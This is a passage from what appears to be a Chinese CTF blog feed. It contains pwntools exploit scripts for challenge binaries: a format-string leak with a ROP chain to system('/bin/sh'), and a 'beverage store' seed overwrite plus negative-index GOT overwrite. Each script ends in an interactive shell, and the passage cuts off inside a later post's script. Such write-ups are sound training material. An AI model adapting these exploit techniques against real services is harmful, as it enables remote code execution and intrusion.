punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length                   <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>lg      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name<span class=\"token punctuation\">:</span> log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"\\033[95m</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>var_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> ：\\033[91m0x</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">globals</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>var_name<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span><span class=\"token format-spec\">x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\\033[0m\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>prl     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>var_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>debug   <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> command<span class=\"token operator\">=</span><span class=\"token string\">''</span>               <span class=\"token punctuation\">:</span> gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span>command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Username:\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'||%7$s-%39$p'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">'Welcome, \\n||'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>password <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">'-0x'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>__libc_start_main <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">128</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'password'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token comment\"># libc = LibcSearcher('__libc_start_main',__libc_start_main)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>libc_base <span class=\"token operator\">=</span> __libc_start_main <span class=\"token operator\">-</span> <span class=\"token number\">0x029dc0</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>system <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0x050d70</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>binsh <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0x1d8678</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>rdi <span class=\"token operator\">=</span> <span class=\"token number\">0x0000000000400661</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">'password: \\n'</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x75746e75ed205fca</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"67\"></td><td><pre></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x75746e75ed205fca</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>py <span class=\"token operator\">=</span> padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rdi<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span>  <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">'>\\n'</span><span class=\"token punctuation\">,</span>py<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'libc_base'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h4 id=\"beverage-store\"><a class=\"markdownIt-Anchor\" href=\"#beverage-store\">#</a> beverage store</h4>\n<p>考点挺简单，覆盖种子和数组越界</p>\n<p>通过覆盖种子进入 buy 函数内，buy 函数由于没有对于索引的负数检验，即可上溢到 got 表，got 是可写段，所以可以先将 exit@got 覆写成 buy 地址，然后泄露 got 内的 libc 内容，然后再次覆写 vuln 函数内容的 printf@got 为 system 地址，最后再将 exit@got 覆写成 vuln 地址即可</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>huan_attack_pwn</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># from pwncli import *</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># from LibcSearcher import *</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">from</span> ctypes <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>context<span class=\"token punctuation\">.</span>terminal <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'tmux'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'splitw'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-h'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-P'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># context(arch='i386' , os='linux', log_level='debug')</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>binary <span class=\"token operator\">=</span> <span class=\"token string\">'./pwn'</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>libc <span class=\"token operator\">=</span> <span class=\"token string\">'./libc.so.6'</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>host<span class=\"token punctuation\">,</span> port <span class=\"token operator\">=</span> <span class=\"token string\">\"125.70.243.22:31830\"</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[31;40mremote\\033[0m: (y)\\n'</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token string\">'\\033[32;40mprocess\\033[0m: (n)'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">if</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'y'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\"># r = gdb.debug(binary)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>libc <span class=\"token operator\">=</span> cdll<span class=\"token punctuation\">.</span>LoadLibrary<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># libc = ELF(libc)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>srand <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>srand<span class=\"token punctuation\">(</span><span class=\"token number\">0xdeadbeef</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#设置种子</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>default <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>                <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> time<span class=\"token operator\">=</span>default             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>rpu     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">,</span>drop<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length                   <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>lg      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name<span class=\"token punctuation\">:</span> log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"\\033[95m</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>var_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> ：\\033[91m0x</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">globals</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>var_name<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span><span class=\"token format-spec\">x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\\033[0m\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>prl     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>var_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>debug   <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> command<span class=\"token operator\">=</span><span class=\"token string\">''</span>               <span class=\"token punctuation\">:</span> gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span>command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">'yours id\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x8</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xdeadbeef</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>v2 <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">'authentication code:\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>v2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token comment\"># libc = '/lib/x86_64-linux-gnu/libc.so.6'</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>libc <span class=\"token operator\">=</span> <span class=\"token string\">'./libc.so.6'</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">'4 wine\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">0x4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">'to choose\\n'</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x40133B</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">'4 wine\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>sa<span class=\"token punctuation\">(</span><span class=\"token string\">'to choose\\n'</span><span class=\"token punctuation\">,</span>p8<span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">'succeed\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>puts <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>libcbase <span class=\"token operator\">=</span> puts <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>system <span class=\"token operator\">=</span>libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre></pre></td></tr><tr><td data-num=\"68\"></td><td><pre><span class=\"token comment\"># debug('b *0x4013fc')</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">'4 wine\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">0x7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>sa<span class=\"token punctuation\">(</span><span class=\"token string\">'to choose\\n'</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">'4 wine\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">0x4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">'to choose\\n'</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x401511</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'libcbase'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "wp"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2024/11/30/24-%E5%8F%A4%E5%89%91%E5%B1%B1wp/",
            "url": "https://yhuanhuan01.github.io/2024/11/30/24-%E5%8F%A4%E5%89%91%E5%B1%B1wp/",
            "title": "24_古剑山wp",
            "date_published": "2024-11-30T13:05:30.000Z",
            "content_html": "<h1 id=\"24古剑山wp_pwn\"><a class=\"markdownIt-Anchor\" href=\"#24古剑山wp_pwn\">#</a> 24 古剑山 WP_pwn</h1>\n<h2 id=\"pwn-in\"><a class=\"markdownIt-Anchor\" href=\"#pwn-in\">#</a> Pwn | in</h2>\n<p><img data-src=\"/img/24%E5%8F%A4%E5%89%91%E5%B1%B1/image-20241130154246471.png\" alt=\"image-20241130154246471\"></p>\n<p>这个题目唯一的坑就是 len = size 是在循环前面，只要先赋值一下 len，可以指定堆块的地方进行任意写。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>huan_attack_pwn</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># from pwncli import *</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># from LibcSearcher import *</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>context<span class=\"token punctuation\">.</span>terminal <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'tmux'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'splitw'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-h'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-P'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># context(arch='amd64', os='linux', log_level='debug')</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># context(arch='i386' , os='linux', log_level='debug')</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>binary <span class=\"token operator\">=</span> <span class=\"token string\">'./pwn'</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>libc <span class=\"token operator\">=</span> <span class=\"token 